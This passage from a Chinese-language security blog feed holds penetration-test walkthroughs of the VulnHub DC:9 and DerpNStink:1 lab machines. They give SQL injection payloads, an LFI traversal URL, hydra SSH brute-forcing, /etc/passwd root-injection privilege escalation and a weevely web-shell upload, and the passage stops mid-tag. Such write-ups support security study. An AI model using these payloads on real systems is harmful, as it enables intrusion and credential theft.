https://github.com/mxrch/snmp-shell<br><span class="hljs-built_in">cd</span> snmp-shell<br>sudo python3 -m pip install -r requirements.txt<br></code></pre></td></tr></table></figure><p>usage:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rlwrap python3 shell.py 192.168.214.149 -c public<br></code></pre></td></tr></table></figure><p>if u need excute long command like u ssh publickey,u need to run the <em>legacy.py</em><br><em>use aÂ <code>ed25519</code>Â SSH publickey, not aÂ <code>RSA</code>Â one, itâ€™s shorter.</em></p>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>penetrate</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp DC:9</title>
    <link href="/vulnhub-wp-DC-9/"/>
    <url>/vulnhub-wp-DC-9/</url>
    
    <content type="html"><![CDATA[<h1 id="ğŸ–³-ä¸»æœºå‘ç°"><a href="#ğŸ–³-ä¸»æœºå‘ç°" class="headerlink" title="ğŸ–³ ä¸»æœºå‘ç°"></a>ğŸ–³ ä¸»æœºå‘ç°</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                           <br>16 Captured ARP Req/Rep packets, from 7 hosts.   Total size: 960                                                                                                        <br>_____________________________________________________________________________<br>  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br>-----------------------------------------------------------------------------<br>192.168.1.1     28:c8:7c:19:bf:e8     10     600  zte corporation                                                                                                       <br>192.168.1.5     20:1e:88:ad:<span class="hljs-built_in">fc</span>:55      1      60  Intel Corporate                                                                                                       <br>192.168.1.6     0c:d8:6c:a5:e7:a1      1      60  SHENZHEN FAST TECHNOLOGIES CO.,LTD                                                                                    <br>192.168.1.10    08:00:27:2a:5c:99      1      60  PCS Systemtechnik GmbH                                                                                                <br>192.168.1.4     c4:e1:a1:cf:47:95      1      60  GUANGDONG OPPO MOBILE TELECOMMUNICATIONS CORP.,LTD                                                                    <br>192.168.1.3     a2:86:90:e6:04:98      1      60  Unknown vendor                                                                                                        <br>192.168.1.2     ca:71:62:08:70:8a      1      60  Unknown vendor                                                                                                        <br></code></pre></td></tr></table></figure><h1 id="ğŸ‘-æœåŠ¡æ‰«æ"><a href="#ğŸ‘-æœåŠ¡æ‰«æ" class="headerlink" title="ğŸ‘ æœåŠ¡æ‰«æ"></a>ğŸ‘ æœåŠ¡æ‰«æ</h1><p>nmap scan</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -p- -oN nmap_scan 192.168.1.10 -sV -sC --min-rate 5000 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-17 15:39 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.10 (192.168.1.10)<br>Host is up (0.00012s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE    SERVICE VERSION<br>22/tcp filtered ssh<br>80/tcp open     http    Apache httpd 2.4.38 ((Debian))<br>|_http-title: Example.com - Staff Details - Welcome<br>|_http-server-header: Apache/2.4.38 (Debian)<br>MAC Address: 08:00:27:2A:5C:99 (Oracle VirtualBox virtual NIC)<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 7.95 seconds<br></code></pre></td></tr></table></figure><h1 id="ğŸšªğŸš¶-è·å–æƒé™"><a href="#ğŸšªğŸš¶-è·å–æƒé™" class="headerlink" title="ğŸšªğŸš¶ è·å–æƒé™"></a>ğŸšªğŸš¶ è·å–æƒé™</h1><p>åœ¨webé¡µé¢å­˜åœ¨sqlæ³¨å…¥ï¼Œå¯ä»¥é€šè¿‡è”åˆæŸ¥è¯¢<br>select database:<code>-1&#39; union select 1,2,3,4,5,database()##</code>, databaseï¼šStaff<br>select tables:<code>-1&#39; union select 1,2,3,4,5,group_concat(table_name) from information_schema.tables where table_schema=database()##</code>, tablesï¼šStaffDetailsï¼ŒUsers<br>select columns_name in users <code>-1&#39; union select 1,2,3,4,5,group_concat(column_name) from information_schema.columns where table_name=&#39;Users&#39;##</code>, columns in Users:UserID,Username,Password<br>select username and password:<code>-1&#39; union select 1,2,3,4,group_concat(Username),group_concat(Password) from Users##</code><br>credentials:<code>admin:856f5de590ef37314e7c3bdf6f8a66dc</code>, we could crack it in <a href="https://crackstation.net/">https://crackstation.net/</a>.<br><code>admin:transorbital1</code><br>æˆ‘ä»¬é€šè¿‡æ‰‹å·¥æŸ¥è¯¢åˆ°äº†webç™»å½•çš„ä¿¡æ¯ï¼Œç„¶åå¯ä»¥ç»§ç»­æ‰‹å·¥æµ‹è¯•æˆ–è€…ç”¨sqlmapç›´æ¥ä¸€æŠŠæ¢­ï¼Œé¦–å…ˆæŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -r sql --dbms=mysql --batch --dbs<br>Â·Â·Â·<br>[19:35:32] [INFO] fetching database names<br>available databases [3]:<br>[*] information_schema<br>[*] Staff<br>[*] <span class="hljs-built_in">users</span><br>Â·Â·Â·<br></code></pre></td></tr></table></figure><ul><li><code>--batch</code> æ‰€æœ‰é€‰é¡¹éƒ½é€‰yes</li><li><code>--dbs</code> çˆ†å‡ºæ‰€æœ‰åº“ã€‚<br>æ—¢ç„¶æˆ‘ä»¬å·²ç»å¾—åˆ°äº†Staffåº“é‡Œçš„ä¿¡æ¯ï¼Œé‚£æˆ‘ä»¬çˆ†ä¸€ä¸‹usersåº“é‡Œçš„ä¸œè¥¿<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -r sql --dbms=mysql --batch -D <span class="hljs-built_in">users</span> --dump<br>Â·Â·Â·<br>Database: <span class="hljs-built_in">users</span><br>Table: UserDetails<br>[17 entries]<br>+----+------------+---------------+---------------------+-----------+-----------+<br>| <span class="hljs-built_in">id</span> | lastname   | password      | reg_date            | username  | firstname |<br>+----+------------+---------------+---------------------+-----------+-----------+<br>| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |<br>| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |<br>| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |<br>| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |<br>| 5  | Cat        | TC&amp;TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |<br>| 6  | Mouse      | B8m<span class="hljs-comment">#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |</span><br>| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |<br>| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |<br>| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |<br>| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |<br>| 11 | Green      | yN72<span class="hljs-comment">#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |</span><br>| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |<br>| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |<br>| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |<br>| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |<br>| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |<br>| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |<br>+----+------------+---------------+---------------------+-----------+-----------+<br>Â·Â·Â·<br></code></pre></td></tr></table></figure></li><li><code>-D</code> æŒ‡å®šæ•°æ®åº“</li><li><code>--dump</code> è·å–å­—æ®µä¸­çš„æ•°æ®ï¼Œå…¶å®å°±æ˜¯çˆ†è¡¨<br>æˆ‘ä»¬å¯ä»¥æŠŠè¿™äº›ç”¨æˆ·åå’Œå¯†ç éƒ½å­˜èµ·æ¥ï¼Œåé¢éœ€è¦å¯†ç å–·æ´’çš„æ—¶å€™ä¼šç”¨ã€‚æ¥ç€æˆ‘ä»¬å»webé¡µé¢ç™»å½•adminçœ‹çœ‹ï¼Œæˆ‘ä»¬ç™»å½•åï¼Œåœ¨æ¯ä¸ªé¡µé¢éƒ½èƒ½å‘ç°ä¸€ä¸ªâ€File does not existâ€ï¼Œå¾ˆå¯èƒ½è¿™ä¸ªé¡µé¢æ˜¯å­˜åœ¨LFIæ¼æ´çš„ï¼Œé‚£æˆ‘ä»¬å¯ä»¥æµ‹è¯•ä¸€ä¸‹å¸¸ç”¨çš„urlå‚æ•°ã€‚<br>ä¸”ç»è¿‡å°è¯•ï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†è¿™ä¸ªknockæœåŠ¡çš„é…ç½®æ–‡ä»¶ã€‚ï¼ˆä»sshæœåŠ¡çš„çŠ¶æ€æ˜¯filteredæˆ‘ä»¬ä¹Ÿå¯ä»¥çŒœæµ‹å¯èƒ½æ˜¯æœ‰é˜²ç«å¢™æˆ–è€…knockæœåŠ¡ï¼‰<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/ff27021c07ae1c2189a26.png"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.1.10/manage.php?file=../../../../etc/knockd.conf<br></code></pre></td></tr></table></figure>é‚£æˆ‘ä»¬æ¥ä¸‹æ¥ç”¨è¿™ä¸ªé¡ºåºå»æ•²é—¨ï¼Œç„¶åå†é€šè¿‡hydraçˆ†ç ´sshæœåŠ¡ï¼Œä»/etc/passwdæ–‡ä»¶ä¸­ä¹Ÿæ­£å¥½çœ‹åˆ°é™¤äº†rootå¤–æœ‰17ä¸ªç”¨æˆ·ï¼Œæ°å¥½å’Œusersåº“ä¸­çš„å¯¹åº”<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">knock 192.168.1.10 7469 8475 9842 -v<br>hitting tcp 192.168.1.10:7469<br>hitting tcp 192.168.1.10:8475<br>hitting tcp 192.168.1.10:9842<br></code></pre></td></tr></table></figure>ç„¶åå†æ£€æŸ¥sshæœåŠ¡<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -p 22 192.168.1.10 -sV -sC                       <br>Â·Â·Â·<br>Host is up (0.00042s latency).<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)<br>Â·Â·Â·<br></code></pre></td></tr></table></figure>ç”¨hydraè¿›è¡Œçˆ†ç ´<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -L <span class="hljs-built_in">users</span> -P passwds 192.168.1.10 ssh -t 4 -I<br>Â·Â·Â·<br>[DATA] attacking ssh://192.168.1.10:22/<br>[STATUS] 92.00 tries/min, 92 tries <span class="hljs-keyword">in</span> 00:01h, 214 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 00:03h, 4 active<br>[22][ssh] host: 192.168.1.10   login: chandlerb   password: UrAG0D!<br>[22][ssh] host: 192.168.1.10   login: joeyt   password: Passw0rd<br>[STATUS] 94.00 tries/min, 282 tries <span class="hljs-keyword">in</span> 00:03h, 24 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 00:01h, 4 active<br>[22][ssh] host: 192.168.1.10   login: janitor   password: Ilovepeepee<br>1 of 1 target successfully completed, 3 valid passwords found<br>Â·Â·Â·<br></code></pre></td></tr></table></figure>åœ¨janitorè´¦æˆ·ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨linpeas.shæ‰¾åˆ°äº†å¦å¤–çš„ä¸€äº›å¯†ç ï¼ŒåŠ å…¥è¿›æˆ‘ä»¬çš„å¯†ç å­—å…¸ï¼Œç„¶åç»§ç»­å–·æ´’ä»¥ä¸‹ssh<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/eb0e0a8787ac9e817f7f8.png"></li></ul><h1 id="ğŸ›¡ï¸-æå‡æƒé™"><a href="#ğŸ›¡ï¸-æå‡æƒé™" class="headerlink" title="ğŸ›¡ï¸ æå‡æƒé™"></a>ğŸ›¡ï¸ æå‡æƒé™</h1><p>ç”¨æ‰¾åˆ°çš„æ–°å¯†ç ç»§ç»­å–·æ´’</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -L <span class="hljs-built_in">users</span> -P passwds 192.168.1.10 ssh -t 4 -I<br>Â·Â·Â·<br>[DATA] attacking ssh://192.168.1.10:22/<br>[STATUS] 40.00 tries/min, 40 tries <span class="hljs-keyword">in</span> 00:01h, 334 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 00:09h, 4 active<br>[22][ssh] host: 192.168.1.10   login: fredf   password: B4-Tru3-001<br>[STATUS] 48.00 tries/min, 144 tries <span class="hljs-keyword">in</span> 00:03h, 230 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 00:05h, 4 active<br>Â·Â·Â·Â·<br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°äº†ä¸€ä¸ªæ–°çš„ç”¨æˆ·å‡­è¯ï¼Œç™»å½•ä¸Šä¹‹åå‘ç°æœ‰sudoå‘½ä»¤<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/be9c08b265c02e4d632d3.png"><br>æˆ‘ä»¬æŸ¥çœ‹/opt/devstuffç›®å½•ä¸‹å­˜åœ¨äºŒè¿›åˆ¶æ–‡ä»¶çš„æºç ï¼Œç®€å•çœ‹è¿‡ä¹‹åå¯ä»¥å‘ç°æ˜¯å°†readæ–‡ä»¶é‡Œçš„åŠ åˆ°ç¬¬äºŒä¸ªæ–‡ä»¶ä¸­å»<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/7dce34921d4d40a9ad9ac.png"><br>æ—¢ç„¶å¦‚æ­¤ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥åœ¨passwdä¸­åŠ ä¸€æ®µè¿›è¡Œææƒ<br>é¦–å…ˆåœ¨æœ¬åœ°ç”Ÿæˆå¯†ç hashå€¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkpasswd -m sha-512 root<br>$6$KpgoDDyFhkOcig11<span class="hljs-variable">$T1rC3qwEWHiTDQLJ1NUyY7W08</span>/xowH7Wsfak6CW1iV/8m0mC2hAgQOWBNBXYNlgGeyQCbgdCeIERWt8s5QS3e0<br></code></pre></td></tr></table></figure><p>å°†è¿™ä¸€æ®µä¿å­˜è¿›æ–‡ä»¶aä¸­ï¼Œç„¶åä½¿ç”¨sudoï¼Œå°†è¿™ä¸€æ®µåŠ å…¥/etc/passwdä¸­</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">root:$6$KpgoDDyFhkOcig11<span class="hljs-variable">$T1rC3qwEWHiTDQLJ1NUyY7W08</span>/xowH7Wsfak6CW1iV/8m0mC2hAgQOWBNBXYNlgGeyQCbgdCeIERWt8s5QS3e0:0:0:root:/root:/bin/bash<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo /opt/devstuff/dist/test/test a /etc/passwd<br></code></pre></td></tr></table></figure><p>æ£€æŸ¥/etc/passwdä¸­æ˜¯å¦åŠ å…¥æˆ‘ä»¬è¿™ä¸€æ®µ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd<br>Â·Â·Â·<br>root1:$6$KpgoDDyFhkOcig11<span class="hljs-variable">$T1rC3qwEWHiTDQLJ1NUyY7W08</span>/xowH7Wsfak6CW1iV/8m0mC2hAgQOWBNBXYNlgGeyQCbgdCeIERWt8s5QS3e0:0:0:root:/root:/bin/bash<br>Â·Â·Â·<br></code></pre></td></tr></table></figure><p>æ—¢ç„¶å·²ç»åŠ å…¥ï¼Œé‚£æˆ‘ä»¬ç›´æ¥åˆ‡æ¢åˆ°root1ç”¨æˆ·<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/3a8ec881c4a17ed9b73a8.png"></p><h1 id="ğŸ“–-æ¨èæ–‡ç« "><a href="#ğŸ“–-æ¨èæ–‡ç« " class="headerlink" title="ğŸ“– æ¨èæ–‡ç« "></a>ğŸ“– æ¨èæ–‡ç« </h1><p><a href="https://www.vulnhub.com/entry/dc-9,412/">DC-9é¶æœºåœ°å€</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp DerpNStink:1</title>
    <link href="/vulnhub-wp-DerpNStink-1/"/>
    <url>/vulnhub-wp-DerpNStink-1/</url>
    
    <content type="html"><![CDATA[<h1 id="ğŸ–³-ä¸»æœºå‘ç°"><a href="#ğŸ–³-ä¸»æœºå‘ç°" class="headerlink" title="ğŸ–³ ä¸»æœºå‘ç°"></a>ğŸ–³ ä¸»æœºå‘ç°</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo netdiscover -r 192.168.1.0/24<br> Currently scanning: Finished!   |   Screen View: Unique Hosts                                     <br>                                                                                                   <br> 16 Captured ARP Req/Rep packets, from 6 hosts.   Total size: 960                                  <br> _____________________________________________________________________________<br>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br> -----------------------------------------------------------------------------                           <br> 192.168.1.5     20:1e:88:ad:<span class="hljs-built_in">fc</span>:55      1      60  Intel Corporate                                 <br> 192.168.1.7     08:00:27:38:ee:93      1      60  PCS Systemtechnik GmbH                                   <br> 192.168.1.3     a2:86:90:e6:04:98      2     120  Unknown vendor                            <br></code></pre></td></tr></table></figure><p>ç›®æ ‡æ˜¯<em>192.168.1.7</em></p><h1 id="ğŸ‘-æœåŠ¡æ‰«æ"><a href="#ğŸ‘-æœåŠ¡æ‰«æ" class="headerlink" title="ğŸ‘ æœåŠ¡æ‰«æ"></a>ğŸ‘ æœåŠ¡æ‰«æ</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.94SVN scan initiated Mon Feb 19 16:02:25 2024 as: nmap -p- -oN nmap_scan -sV -sC --min-rate 5000 192.168.1.7</span><br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.7 (192.168.1.7)<br>Host is up (0.00040s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>21/tcp open  ftp     vsftpd 3.0.2<br>22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)<br>|   2048 72:c5:1c:5f:81:7b:<span class="hljs-built_in">dd</span>:1a:fb:2e:59:67:fe:a6:91:2f (RSA)<br>|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)<br>|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)<br>80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))<br>|_http-server-header: Apache/2.4.7 (Ubuntu)<br>|_http-title: DeRPnStiNK<br>| http-robots.txt: 2 disallowed entries <br>|_/php/ /temporary/<br>MAC Address: 08:00:27:38:EE:93 (Oracle VirtualBox virtual NIC)<br>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br><span class="hljs-comment"># Nmap done at Mon Feb 19 16:02:34 2024 -- 1 IP address (1 host up) scanned in 8.81 seconds</span><br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªflagè—åœ¨ä¸»é¡µçš„æºä»£ç é‡Œ.ç„¶åç”¨dirbå·¥å…·çˆ†ç ´ç›®å½•ï¼Œå‘ç°äº†ä¸€ä¸ªweblogç›®å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirb http://192.168.1.7<br></code></pre></td></tr></table></figure><p>è®¿é—®ä¹‹åå‘ç°æ˜¯ä¸€ä¸ªwordpressåšå®¢ã€‚é€šè¿‡å°è¯•å¯ä»¥çŸ¥é“èƒ½é€šè¿‡å¼±å£ä»¤<code>admin:admin</code>ç™»å½•ä¸Šåå°ï¼Œä½†æ˜¯è²Œä¼¼adminå¹¶ä¸æ˜¯ç®¡ç†å‘˜ç”¨æˆ·ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å‘ç°ä¸€ä¸ªslideshowæ’ä»¶ï¼Œåœ¨exploitdbå¯ä»¥æœç´¢åˆ°æ¼æ´ã€‚<br>exploitï¼š<code>https://www.exploit-db.com/exploits/34681</code></p><h1 id="ğŸšªğŸš¶-è·å–æƒé™"><a href="#ğŸšªğŸš¶-è·å–æƒé™" class="headerlink" title="ğŸšªğŸš¶ è·å–æƒé™"></a>ğŸšªğŸš¶ è·å–æƒé™</h1><p>å…ˆç”¨weevelyç”Ÿæˆä¸€ä¸ªåé—¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">weevely generate admin back.php<br></code></pre></td></tr></table></figure><ul><li><code>admin</code> æŒ‡å®šåé—¨å¯†ç <br>ç„¶åç”¨åˆ©ç”¨æ¼æ´ä»£ç ä¸Šä¼ åé—¨ï¼ˆå…¶å®ç›´æ¥ä¸Šä¼ ä¹Ÿå¯ä»¥ï¼‰<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2 34681.py -t 192.168.1.7/weblog -f back.php -u admin -p admin<br></code></pre></td></tr></table></figure>ç„¶åç”¨weevelyè¿æ¥<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">weevely http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/backdoor.php admin<br></code></pre></td></tr></table></figure>ç„¶åå¾—åˆ°äº†ä¸€ä¸ªç®€æ˜“çš„shellï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å†ç”¨bashåå¼¹ä¸€ä¸ªshellå›å»ã€‚<br>ç„¶åç”¨linpeas.shè¿›è¡Œè‡ªåŠ¨æšä¸¾ï¼Œå‘ç°äº†ä¸€äº›æ•°æ®åº“çš„å¯†ç ï¼Œåœ¨<em>192.168.1.7/php</em>çš„ç›®å½•ä¸‹æ˜¯æœ‰ä¸€ä¸ªphpmyadminï¼ˆå¯é€šè¿‡dirbæ‰«æå‡ºæ¥ï¼‰çš„ï¼Œæˆ‘ä»¬ç”¨æ‰¾åˆ°çš„ç”¨æˆ·åå’Œå¯†ç ç™»å½•<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/0aba081c2421d1866a869.png"><br>ç™»å½•ä¸Šä¹‹åï¼Œåœ¨mysql.userè¡¨é‡Œé¢æ‰¾åˆ°äº†unclestinkyçš„ç”¨æˆ·åå’Œå¯†ç <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">unclestinky:*9B776AFB479B31E8047026F1185E952DD1E530CB<br></code></pre></td></tr></table></figure>è¯¥å¯†ç å¯åœ¨ç½‘ç«™<a href="https://crackstation.net/"><em>crackstation</em></a> å¤„ç ´è§£ï¼Œå¾—åˆ°å‡­è¯<code>unclestinky:wedgie57</code><br>ç„¶ååœ¨wordpress.wp-usersè¡¨é‡Œé¢æ‰¾åˆ°unclestinkyçš„ç”¨æˆ·åå’Œå¯†ç <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">unclestinky:$P<span class="hljs-variable">$BW6NTkFvboVVCHU2R9qmNai1WfHSC41</span><br></code></pre></td></tr></table></figure><h1 id="ğŸ›¡ï¸-æå‡æƒé™"><a href="#ğŸ›¡ï¸-æå‡æƒé™" class="headerlink" title="ğŸ›¡ï¸ æå‡æƒé™"></a>ğŸ›¡ï¸ æå‡æƒé™</h1>è€ƒè™‘åˆ°å¯†ç çš„å¤ç”¨æ€§ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªå¯†ç å»ç™»å½•stinkyç”¨æˆ·ï¼Œä½¿ç”¨shåˆ‡æ¢åˆ°stinkyç”¨æˆ·ï¼Œç„¶åè¾“å…¥å¯†ç ï¼ŒæˆåŠŸç™»å½•ã€‚<br>åœ¨stinkyçš„ç›®å½•ä¸‹æ‰¾åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œé‡Œé¢æœ‰ä¸€äº›æç¤ºï¼Œåœ¨ç»™ç”¨æˆ·mrderpä¿®å¤çš„æ—¶å€™ï¼ŒæŠ“äº†æµé‡åŒ…ï¼Œæ‰¾åˆ°è¿™ä¸ªæµé‡åŒ…ä¹Ÿè®¸æˆ‘ä»¬å¯ä»¥ä»ä¸­æ‰¾åˆ°mrderpçš„å¯†ç <br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/02004c28e179b4243bf38.png"><br>ç”¨wiresharkæ‰“å¼€åè¿½è¸ªtcpæµï¼Œåœ¨ç¬¬37ä¸ªtcpæµçš„æ—¶å€™ï¼Œæ‰¾åˆ°äº†å…³é”®ä¿¡æ¯ã€‚ä¹Ÿå¯ä»¥ç›´æ¥ç­›é€‰httpï¼Œå› ä¸ºæœ‰æç¤ºè¿‡å’Œä¿®æ”¹wordpressçš„å¯†ç æœ‰å…³ã€‚<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a408631ca42fd4997260f.png"><br>æˆ‘ä»¬å¾—åˆ°äº†ç”¨æˆ·mrderpçš„å£ä»¤derpderpderpderpderpderpderpã€‚å¾—åˆ°å£ä»¤åæ‹¿å»sshå°è¯•ç™»å½•ï¼Œç™»å½•æˆåŠŸã€‚<br><img 